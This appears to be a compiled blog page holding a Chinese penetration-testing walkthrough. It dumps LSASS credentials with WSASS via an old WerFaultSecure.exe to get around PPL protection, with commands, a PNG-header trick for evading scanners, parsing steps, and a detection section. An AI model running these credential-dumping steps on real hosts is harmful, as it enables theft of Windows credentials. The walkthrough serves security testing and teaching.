"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[323],{755:(e,i,s)=>{e.exports=s.p+"assets/img/ch3-17-wsass.c6a38048.png"},59290:(e,i,s)=>{s.r(i),s.d(i,{comp:()=>n,data:()=>l});var a=s(92565),t=s(755);const r={},n=(0,s(17275).A)(r,[["render",function(e,i){const s=(0,a.g2)("RouteLink");return(0,a.uX)(),(0,a.CE)("div",null,[i[3]||(i[3]=(0,a.Fv)('<h2 id="适用场景" tabindex="-1"><a class="header-anchor" href="#适用场景"><span>适用场景</span></a></h2><p>ProcDump 的前提是能打开 LSASS。一旦 LSASS 以 PPL 运行，普通管理员权限就不够了。ProcDump 会直接报 <code>Access is denied</code>，换什么参数都没用。</p><p>WSASS 走的是另一条路：不直接打开 LSASS，而是借 Windows 错误报告（WER）的 <code>WerfaultSecure.exe</code> 来转储。这个进程本身以 PPL 级别运行，能访问受保护的进程。</p><p>在 25H2 上实测时，<code>RunAsPPL=0</code> 也能成功，说明它不只适用于 PPL 场景。</p><h2 id="工作原理" tabindex="-1"><a class="header-anchor" href="#工作原理"><span>工作原理</span></a></h2><p>WSASS 的命令行很简单：</p><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-cmd"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">WSASS.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;PathToWerFaultSecure.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt; &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">TargetPID</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>执行后大致做这几件事：</p><ol><li>启用 <code>SeDebugPrivilege</code>；</li><li>用一个旧版 <code>WerfaultSecure.exe</code> 创建 PPL 进程；</li><li>让这个进程去转储目标；</li><li>生成 minidump；</li><li>把文件头的 <code>MDMP</code> 替换成 PNG 魔数，文件名通常是 <code>proc.png</code>。</li></ol><p>最后一步是为了降低被静态扫描发现的概率。代价是解析前必须把文件头改回来。</p><h2 id="下载" tabindex="-1"><a class="header-anchor" href="#下载"><span>下载</span></a></h2><p>官方 release 是一个压缩包：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>https://github.com/TwoSevenOneT/WSASS/releases/download/main/WSASS_Release_1.0.zip</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>里面有两个关键文件：</p><ul><li><code>WSASS.exe</code>；</li><li><code>WerFaultSecure.exe</code>（旧版，36 KB 左右）。</li></ul><p>应使用压缩包自带的旧版。系统自带的 <code>WerfaultSecure.exe</code> 可能已经修复相关行为，WSASS 不一定成功。</p><h2 id="实战步骤" tabindex="-1"><a class="header-anchor" href="#实战步骤"><span>实战步骤</span></a></h2><h3 id="_1-确认-lsass-的-pid" tabindex="-1"><a class="header-anchor" href="#_1-确认-lsass-的-pid"><span>1. 确认 LSASS 的 PID</span></a></h3><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-cmd"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">tasklist</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">fi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;imagename eq lsass.exe&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>本机输出：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>lsass.exe   1224   Services   0   12,345 K</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>PID 每次重启都会变化，执行前需要重新确认。</p><h3 id="_2-执行-wsass" tabindex="-1"><a class="header-anchor" href="#_2-执行-wsass"><span>2. 执行 WSASS</span></a></h3><p>把两个文件放在同一目录，管理员权限运行：</p><div class="language-cmd line-numbers-mode" data-highlighter="shiki" data-ext="cmd" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-cmd"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">WSASS.exe WerFaultSecure.exe </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1224</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>输出大概是这样：</p><figure><img src="'+t+'" alt="WSASS 转储 LSASS" tabindex="0" loading="lazy"><figcaption>WSASS 转储 LSASS</figcaption></figure><p>几个关键行：</p><ul><li><code>SeDebugPrivilege enabled successfully.</code>：权限没问题；</li><li><code>Successfully created PPL process with PID: 25880</code>：成功创建 PPL 进程；</li><li><code>Protection level: PROTECTION_LEVEL_WINTCB_LIGHT</code>：进程保护级别；</li><li><code>Process WerfaultSecure.exe exited with code: 2147942526</code>：子进程退出码；</li><li><code>Process dump successfully</code>：转储完成。</li></ul><p>该退出码不影响结果，dump 已正常生成。</p><h3 id="_3-找到输出文件" tabindex="-1"><a class="header-anchor" href="#_3-找到输出文件"><span>3. 找到输出文件</span></a></h3><p>默认在当前目录生成 <code>proc.png</code>，本机大小约 85.9 MB：</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-powershell"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-Item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\proc.png | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Select-Object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Name, Length</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>该文件不是图片，文件头是 PNG 魔数，内容实际是 minidump，不要双击打开。</p><h3 id="_4-恢复-mdmp-头" tabindex="-1"><a class="header-anchor" href="#_4-恢复-mdmp-头"><span>4. 恢复 MDMP 头</span></a></h3><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-powershell"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$p</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;C:\\temp\\proc.png&#39;</span></span>\n<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$b</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">IO.File</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::ReadAllBytes(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">byte</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]]</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$magic</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0x4D</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0x44</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0x4D</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0x50</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   # MDMP</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$i</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$i</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -lt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$i</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) { </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $magic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] }</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">IO.File</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::WriteAllBytes(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>改完后把文件重命名为 <code>lsass.dmp</code>，再交给解析工具。</p><h3 id="_5-解析" tabindex="-1"><a class="header-anchor" href="#_5-解析"><span>5. 解析</span></a></h3><p>使用 KvcForensic 解析：</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-powershell"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">KvcForensic.exe</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> --</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">analyze</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dump </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">--</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">input lsass.dmp </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">--</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">output result.txt </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">--</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">format txt </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">--</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">full</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>它选中 <code>MSV_x64_11_25H2</code> 模板后解析成功，说明 WSASS 生成的 dump 是完整的。</p><p>Pypykatz 也可以试，但在 25H2 上大概率还是卡在 MSV，原因和 ProcDump 的 dump 一样，不是 WSASS 的问题。</p><h2 id="_25h2-实测结果" tabindex="-1"><a class="header-anchor" href="#_25h2-实测结果"><span>25H2 实测结果</span></a></h2><table><thead><tr><th>项目</th><th>结果</th></tr></thead><tbody><tr><td>系统</td><td>Windows 11 25H2，Build 26200</td></tr><tr><td>LSASS 保护</td><td><code>RunAsPPL=0</code></td></tr><tr><td>WSASS 版本</td><td>1.0</td></tr><tr><td>WerFaultSecure</td><td>压缩包自带的旧版</td></tr><tr><td>PPL 级别</td><td><code>PROTECTION_LEVEL_WINTCB_LIGHT</code></td></tr><tr><td>输出</td><td><code>proc.png</code>，85.9 MB</td></tr><tr><td>恢复头后解析</td><td>KvcForensic 成功</td></tr></tbody></table><p>本机没有开 PPL，所以严格来说用 ProcDump 就够了。WSASS 在这里的价值是验证它在 25H2 上还能跑通，而不是证明它比 ProcDump 更强。</p><h2 id="它适合什么场景" tabindex="-1"><a class="header-anchor" href="#它适合什么场景"><span>它适合什么场景</span></a></h2><ul><li>LSASS 以 PPL 运行，ProcDump 打不开；</li><li>不想加载内核驱动，KVC 的驱动方案成本太高；</li><li>有可用的旧版 <code>WerfaultSecure.exe</code>；</li><li>目标机的 EDR 对 WER 进程链监控不严。</li></ul><p>不适合的场景：</p><ul><li>目标机开了 Credential Guard，dump 出来也没有域凭据；</li><li>杀软直接拦截 WER 子进程创建；</li><li>你拿不到旧版 <code>WerfaultSecure.exe</code>。</li></ul><h2 id="检测与防御" tabindex="-1"><a class="header-anchor" href="#检测与防御"><span>检测与防御</span></a></h2><p>WSASS 的行为链比较固定：</p><ul><li>创建 <code>WerfaultSecure.exe</code> 子进程；</li><li>该进程以 PPL 级别运行；</li><li>随后出现大文件写入，文件名可能是 <code>proc.png</code>；</li><li>过程中存在对 <code>lsass.exe</code> 的访问。</li></ul><p>可以关注：</p><ul><li>Sysmon Event ID 1（进程创建），父进程不是 <code>werfault.exe</code> 却出现 <code>WerfaultSecure.exe</code>；</li><li>Sysmon Event ID 11（文件创建），大体积 <code>proc.png</code>；</li><li>Sysmon Event ID 10（ProcessAccess），目标为 <code>lsass.exe</code>；</li><li>Defender 的 ASR 规则和 Credential Guard；</li><li>对 WER 目录和 <code>WerfaultSecure.exe</code> 的完整性监控。</li></ul><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接"><span>参考链接</span></a></h2><table><thead><tr><th>链接</th><th>用途</th></tr></thead><tbody><tr><td><a href="https://github.com/TwoSevenOneT/WSASS" target="_blank" rel="noopener noreferrer">WSASS GitHub</a></td><td>源码、命令格式、PNG 头说明</td></tr><tr><td><a href="https://github.com/TwoSevenOneT/WSASS/releases/download/main/WSASS_Release_1.0.zip" target="_blank" rel="noopener noreferrer">WSASS Release 1.0</a></td><td>下载 WSASS 和自带的旧版 WerFaultSecure</td></tr><tr><td><a href="https://www.zerosalarium.com/2025/09/Dumping-LSASS-With-WER-On-Modern-Windows-11.html" target="_blank" rel="noopener noreferrer">Dumping LSASS With WER</a></td><td>作者写的完整原理和实战过程，强烈建议先读</td></tr><tr><td><a href="https://github.com/TwoSevenOneT/CreateProcessAsPPL" target="_blank" rel="noopener noreferrer">CreateProcessAsPPL</a></td><td>同作者的无驱动 PPL 进程创建工具，理解 WSASS 的前置能力</td></tr><tr><td><a href="https://www.youtube.com/watch?v=FZ20oQ-pVwg" target="_blank" rel="noopener noreferrer">WSASS 演示视频</a></td><td>看一遍实际运行过程，比读文字直观</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/windows/win32/wer/windows-error-reporting" target="_blank" rel="noopener noreferrer">Windows Error Reporting</a></td><td>WER 的官方文档，理解 WerFaultSecure 的角色</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-" target="_blank" rel="noopener noreferrer">Protecting anti-malware services</a></td><td>PPL 保护机制的官方说明</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection" target="_blank" rel="noopener noreferrer">配置 LSA 保护</a></td><td><code>RunAsPPL</code> 的配置和影响</td></tr><tr><td><a href="https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_header" target="_blank" rel="noopener noreferrer">MINIDUMP_HEADER</a></td><td>理解 <code>MDMP</code> 头和恢复方法</td></tr><tr><td><a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank" rel="noopener noreferrer">MITRE ATT&amp;CK T1003.001</a></td><td>LSASS 凭据转储的技术编号</td></tr><tr><td><a href="https://www.atomicredteam.io/atomic-red-team/atomics/T1003.001" target="_blank" rel="noopener noreferrer">Atomic Red Team T1003.001</a></td><td>检测规则验证</td></tr><tr><td><a href="https://hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html" target="_blank" rel="noopener noreferrer">HackTricks：Stealing Windows Credentials</a></td><td>对比其他转储路径</td></tr></tbody></table><h2 id="相关文章" tabindex="-1"><a class="header-anchor" href="#相关文章"><span>相关文章</span></a></h2>',57)),(0,a.Lk)("ul",null,[(0,a.Lk)("li",null,[(0,a.bF)(s,{to:"/perm/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/ProcDump%E8%BD%AC%E5%82%A8LSASS%E5%AE%9E%E6%88%98.html"},{default:(0,a.k6)(()=>[...i[0]||(i[0]=[(0,a.eW)("ProcDump 转储 LSASS",-1)])]),_:1})]),(0,a.Lk)("li",null,[(0,a.bF)(s,{to:"/perm/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Pypykatz%E7%A6%BB%E7%BA%BF%E8%A7%A3%E6%9E%90LSASS%E5%AE%9E%E6%88%98.html"},{default:(0,a.k6)(()=>[...i[1]||(i[1]=[(0,a.eW)("Pypykatz 离线解析",-1)])]),_:1})]),(0,a.Lk)("li",null,[(0,a.bF)(s,{to:"/perm/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/KvcForensic%E8%A7%A3%E6%9E%90LSASS%E5%AE%9E%E6%88%98.html"},{default:(0,a.k6)(()=>[...i[2]||(i[2]=[(0,a.eW)("KvcForensic 解析 LSASS",-1)])]),_:1})])]),i[4]||(i[4]=(0,a.Lk)("div",{class:"hint-container warning"},[(0,a.Lk)("p",{class:"hint-container-title"},"声明"),(0,a.Lk)("p",null,"本文仅用于授权的安全测试与教学环境。WSASS 利用的是 Windows 错误报告机制，请勿在未授权主机上使用。")],-1))])}]]),l=JSON.parse('{"path":"/perm/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/WSASS%E8%BD%AC%E5%82%A8PPL%E8%BF%9B%E7%A8%8B%E5%AE%9E%E6%88%98.html","title":"WSASS 转储 PPL 进程：借 WerFaultSecure 绕过 LSASS 保护","lang":"zh-CN","frontmatter":{"title":"WSASS 转储 PPL 进程：借 WerFaultSecure 绕过 LSASS 保护","short_title":"WSASS 转储 PPL 进程","date":"2026-11-22T20:40:00.000Z","description":"WSASS 的原理、下载、命令行用法、25H2 实测过程、PNG 头恢复方法，以及 PPL 和 WER 相关文档链接。","tag":["WSASS","PPL","LSASS","WerFaultSecure"],"category":["渗透测试"],"timeline":true,"isOriginal":true,"index":true,"order":11,"head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"WSASS 转储 PPL 进程：借 WerFaultSecure 绕过 LSASS 保护\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2026-11-22T20:40:00.000Z\\",\\"dateModified\\":\\"2026-11-22T12:54:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"],["meta",{"property":"og:url","content":"https://min168.top/perm/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/WSASS%E8%BD%AC%E5%82%A8PPL%E8%BF%9B%E7%A8%8B%E5%AE%9E%E6%88%98.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"WSASS 转储 PPL 进程：借 WerFaultSecure 绕过 LSASS 保护"}],["meta",{"property":"og:description","content":"WSASS 的原理、下载、命令行用法、25H2 实测过程、PNG 头恢复方法，以及 PPL 和 WER 相关文档链接。"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2026-11-22T12:54:38.000Z"}],["meta",{"property":"article:tag","content":"WerFaultSecure"}],["meta",{"property":"article:tag","content":"LSASS"}],["meta",{"property":"article:tag","content":"PPL"}],["meta",{"property":"article:tag","content":"WSASS"}],["meta",{"property":"article:published_time","content":"2026-11-22T20:40:00.000Z"}],["meta",{"property":"article:modified_time","content":"2026-11-22T12:54:38.000Z"}]]},"git":{"createdTime":1795352078000,"updatedTime":1795352078000,"contributors":[{"name":"ezouy","username":"ezouy","email":"youze27@163.com","commits":1,"url":"https://github.com/ezouy"}],"changelog":[{"hash":"e98b3485c6760c3173c229928061f68f6dc3fd58","time":1795352078000,"email":"youze27@163.com","author":"ezouy","message":"docs: 归档待整理笔记，补全红队信息收集与凭据提取工具文章"}]},"readingTime":{"minutes":4.53,"words":1358},"filePathRelative":"perm/后渗透与权限维持/WSASS转储PPL进程实战.md","excerpt":"<h2>适用场景</h2>\\n<p>ProcDump 的前提是能打开 LSASS。一旦 LSASS 以 PPL 运行，普通管理员权限就不够了。ProcDump 会直接报 <code>Access is denied</code>，换什么参数都没用。</p>\\n<p>WSASS 走的是另一条路：不直接打开 LSASS，而是借 Windows 错误报告（WER）的 <code>WerfaultSecure.exe</code> 来转储。这个进程本身以 PPL 级别运行，能访问受保护的进程。</p>\\n<p>在 25H2 上实测时，<code>RunAsPPL=0</code> 也能成功，说明它不只适用于 PPL 场景。</p>"}')}}]);